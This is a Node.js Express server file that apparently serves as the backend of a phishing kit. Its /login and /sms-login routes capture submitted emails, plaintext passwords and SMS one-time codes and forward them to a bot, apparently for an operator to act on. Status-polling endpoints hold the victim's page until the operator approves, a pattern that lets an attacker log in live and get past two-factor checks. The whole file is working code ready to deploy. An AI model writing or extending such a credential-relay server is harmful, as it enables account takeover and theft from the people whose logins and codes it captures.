console.log("📦 Starting combined server.js...");

const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const fetch = require("node-fetch");
const { sendApprovalRequest, sendApprovalRequestSMS } = require("./bot");

const app = express();
const PORT = process.env.PORT || 3000;

// Store pending approvals
let pendingUsers = {}; // for email/password login
let pendingCodes = {}; // for SMS codes

app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static("public"));

// -----------------
// Health check
// -----------------
app.get("/", (req, res) => {
  res.send("✅ Combined Server is running.");
});

// -----------------
// Email/Password Login
// -----------------
app.post("/login", (req, res) => {
  const email = (req.body.email || "").trim().toLowerCase();
  const password = req.body.password;

  if (!email || !password) return res.status(400).json({ success: false, message: "Email and password required" });

  pendingUsers[email] = { password, status: "pending" };
  console.log(`📥 Login Received: ${email}`);

  sendApprovalRequest(email, password);

  res.json({ success: true });
});

app.get("/check-status", (req, res) => {
  const email = (req.query.email || "").trim().toLowerCase();
  if (pendingUsers[email]) {
    return res.json({ status: pendingUsers[email].status });
  } else if (pendingCodes[email]) {
    return res.json({ status: pendingCodes[email].status });
  } else {
    return res.json({ status: "unknown" });
  }
});

app.post("/update-status", (req, res) => {
  const identifier = (req.body.email || req.body.code || "").trim();
  const status = req.body.status;

  console.log("📬 Update Status Received:", identifier, status);

  if (pendingUsers[identifier]) {
    pendingUsers[identifier].status = status;
    console.log(`✅ Login status updated for: ${identifier}`);
    return res.json({ ok: true });
  } else if (pendingCodes[identifier]) {
    pendingCodes[identifier].status = status;
    console.log(`✅ SMS status updated for: ${identifier}`);
    return res.json({ ok: true });
  } else {
    console.log(`❌ Identifier not found: ${identifier}`);
    return res.json({ ok: false, message: "Identifier not found" });
  }
});

// -----------------
// SMS Login
// -----------------
app.post("/sms-login", (req, res) => {
  const code = (req.body.code || "").trim();
  if (!code) return res.status(400).json({ success: false, message: "Code required" });

  pendingCodes[code] = { status: "pending" };
  console.log(`📥 SMS Code Received: ${code}`);

  sendApprovalRequestSMS(code);

  res.json({ success: true });
});

app.get("/check-sms-status", (req, res) => {
  const code = (req.query.code || "").trim();
  if (!pendingCodes[code]) return res.json({ status: "unknown" });
  res.json({ status: pendingCodes[code].status });
});

// -----------------
// Self-ping to stay awake
// -----------------
setInterval(() => {
  const url = process.env.APP_URL;
  if (url) {
    fetch(url)
      .then(() => console.log("🔁 Pinged self"))
      .catch(err => console.error("⚠️ Ping failed:", err));
  }
}, 30 * 1000);

// -----------------
// Start server
// -----------------
app.listen(PORT, () => {
  console.log(`✅ Combined server running at http://localhost:${PORT}`);
});
